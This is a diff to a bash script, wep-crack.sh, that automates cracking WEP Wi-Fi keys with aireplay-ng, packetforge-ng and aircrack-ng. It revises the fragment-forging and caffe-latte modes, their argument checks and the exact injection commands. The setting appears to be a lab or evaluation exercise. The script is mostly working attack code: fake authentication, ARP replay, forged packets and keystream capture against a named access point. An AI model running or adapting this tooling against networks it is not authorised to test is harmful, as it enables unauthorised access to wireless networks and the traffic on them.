@@ -14,17 +14,19 @@
 #                 (e.g. the Intel AC8260). Good for practice and for the analysis
 #                 half of the writeup.
 #   forge   mode: active, with a forged ARP request. aireplay-ng --fragment takes a keystream from a
-#                 data packet the AP sends (up to 120 s), packetforge-ng builds an ARP request from
-#                 it, and aireplay-ng --interactive replays that. Use it when the network sends no
-#                 ARP request of its own for active mode to copy.
-#   caffe   mode: active, with aireplay-ng --caffe-latte against the one client given with -C. That
-#                 client may be deauthenticated, so give only a device you may disconnect: your own phone
-#                 on GL, or a client of the evaluation network inside the window.
+#                 data frame that the AP relays to the client named with -C (up to 120 s),
+#                 packetforge-ng builds an ARP request from it, and aireplay-ng --interactive replays
+#                 that. The fragment attack matches only frames addressed to that client, so -C is
+#                 required for forge.
+#   caffe   mode: aireplay-ng --caffe-latte. It needs no client address and sends no deauthentication.
+#                 It replays a broadcast ARP frame that a client sends, and the client answers with new
+#                 IVs. Until a client sends one, it works like passive mode: the IVs come from the
+#                 traffic the client already sends.
 #
 # Usage:
 #   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m MODE] [-C <CLIENT_MAC>] [-o prefix] [-t N] [-x pps]
 #   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m MODE] [-C <CLIENT_MAC>] [-o prefix] [-t N] [-x pps]
-#   MODE is active, passive, forge or caffe. -C is required for caffe and refused by the other modes.
+#   MODE is active, passive, forge or caffe. -C is required for forge and refused by the other modes.
 #
 # Example:
 #   sudo ./scripts/wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
@@ -64,7 +66,7 @@ RETRY_SECS=3             # seconds between progress lines (airodump rewrites the
 STALL_SECS=60            # warn when no ARP ACK arrives for this long (active mode)
 MAX_FAKEAUTH_FAILS=3     # fake-auth relaunches in a row that never associate before the run stops
 RATE_CAP=""              # -x: replay packets per second (active, forge, caffe). Empty = uncapped
-CLIENT=""                # -C: the connected client that caffe mode deauthenticates and answers from
+CLIENT=""                # -C: the client the AP relays to, for forge (aireplay-ng -c). Empty = none
 FRAG_LIMIT=120           # forge: seconds the fragment attack may wait for a data packet from the AP
 
 while getopts ":i:M:b:c:e:m:o:t:x:C:h" opt; do
@@ -90,8 +92,8 @@ wifi_preflight airmon-ng airodump-ng aireplay-ng packetforge-ng aircrack-ng iw i
 [[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
 [[ "$MODE" =~ ^(active|passive|forge|caffe)$ ]] || die "-m must be active, passive, forge or caffe. For a monitor that is already up, use -M."
 [[ -z "$CLIENT" || "$CLIENT" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || die "-C must be a MAC address such as 11:22:33:44:55:66"
-[[ "$MODE" != caffe || -n "$CLIENT" ]] || die "-m caffe needs -C <client MAC>: a device connected to the AP, such as your phone."
-[[ -z "$CLIENT" || "$MODE" == caffe ]] || die "-C is only used by -m caffe."
+[[ "$MODE" != forge || -n "$CLIENT" ]] || die "-m forge needs -C <client MAC>: the client the AP sends data to, such as your phone. The fragment attack matches only frames for that client."
+[[ -z "$CLIENT" || "$MODE" == forge ]] || die "-C is only used by -m forge."
 [[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
 [[ -z "$RATE_CAP" || "$RATE_CAP" =~ ^[1-9][0-9]*$ ]] || die "-x must be a positive number of packets per second"
 if [[ -n "$MONIFACE" ]]; then
@@ -197,17 +199,18 @@ wait_for_association() {
   die "The fake station did not associate within 20 s, so the attack was not started. See ${OUT}-fakeauth.txt"
 }
 
-# forge, step 1: aireplay-ng --fragment saves a keystream (fragment-*.xor) from one data packet the AP
-# sends. -F takes the first packet that fits, so nothing waits for a keypress. stdin is /dev/null.
+# forge, step 1: aireplay-ng --fragment saves a keystream (fragment-*.xor) from a data frame that the AP
+# relays to the client in -C (aireplay-ng -c). -F takes the first match, so nothing waits for a keypress.
+# stdbuf keeps the output current. timeout sends INT first, which aireplay-ng handles. stdin is /dev/null.
 forge_keystream() {
-  echo "[*] Fragment attack: waiting up to ${FRAG_LIMIT} s for a data packet from $BSSID..."
-  ( cd "$RUNDIR" && exec timeout -k 5 "$FRAG_LIMIT" aireplay-ng --ignore-negative-one --fragment -F -b "$BSSID" -h "$MYMAC" "$MON" ) \
+  echo "[*] Fragment attack: waiting up to ${FRAG_LIMIT} s for a frame the AP relays to $CLIENT..."
+  ( cd "$RUNDIR" && exec timeout -s INT -k 5 "$FRAG_LIMIT" stdbuf -oL aireplay-ng --ignore-negative-one --fragment -F -b "$BSSID" -c "$CLIENT" -h "$MYMAC" "$MON" ) \
     >"${OUT}-fragment.txt" 2>&1 </dev/null &
   frag_pid=$!
   track_pid "$frag_pid"
   wait "$frag_pid"
   KEYSTREAM=$(ls -t "$RUNDIR"/fragment-*.xor 2>/dev/null | head -n 1)
-  [[ -n "$KEYSTREAM" ]] || die "No keystream from the fragment attack (it ran up to ${FRAG_LIMIT} s). See ${OUT}-fragment.txt. A download on a client gives the AP data to send (COMMANDS.md section 9)."
+  [[ -n "$KEYSTREAM" ]] || die "No keystream from the fragment attack (it ran up to ${FRAG_LIMIT} s). See ${OUT}-fragment.txt. Check -C, and run a download on that client (COMMANDS.md section 9)."
   echo "[*] Keystream saved to $KEYSTREAM"
 }
 
@@ -250,10 +253,10 @@ case "$MODE" in
     ;;
   caffe)
     wait_for_association
-    echo "[*] Caffe-latte against client $CLIENT: it may deauthenticate that client, so it can drop and reconnect."
-    # -b filters the capture to the AP and -a sets the AP for the attack (aireplay-ng --help). Both are
-    # given until a test shows which one caffe-latte reads.
-    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --caffe-latte -a "$BSSID" -b "$BSSID" -c "$CLIENT" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
+    # aireplay-ng 1.7 reads -b (the AP) here and never reads -c. It replays a broadcast ARP frame from a
+    # client when one comes; until then it only listens, so the IVs come from the client's traffic.
+    echo "[*] Caffe-latte: no client address needed. It replays a client's broadcast ARP when one comes."
+    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --caffe-latte -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
       >"$REPLAY_OUT" 2>&1 &
     replay_pid=$!
     track_pid "$replay_pid"
